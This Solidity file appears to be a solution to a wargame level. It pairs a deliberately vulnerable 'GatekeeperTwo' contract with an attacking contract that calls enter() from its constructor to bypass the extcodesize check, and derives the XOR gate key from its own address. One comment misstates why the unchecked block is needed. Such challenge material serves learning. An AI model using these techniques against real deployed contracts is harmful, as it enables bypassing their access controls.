// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGatekeeperTwo {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;

        // the way how bitwise XOR operation works is similar to
        //  a ^ b = c so a ^ c = b
        // which is how we get the key 

        // reason why we use `unchecked` block is because in solidity 0.8.0^ arithmetic expressions 
        // are validated by the compiler for any underflow/overflows
        
        // without the `unchecked` block, gas estimation would exceed 
        unchecked {
            bytes8 key = bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                    (uint64(0) - 1)
            );
            // we run the enter() function in the constructor of the attacker contract to get a extcodesize of 0
            // codesize of contract == 0
            gatekeeperTwo.enter(key);
        }
    }
}
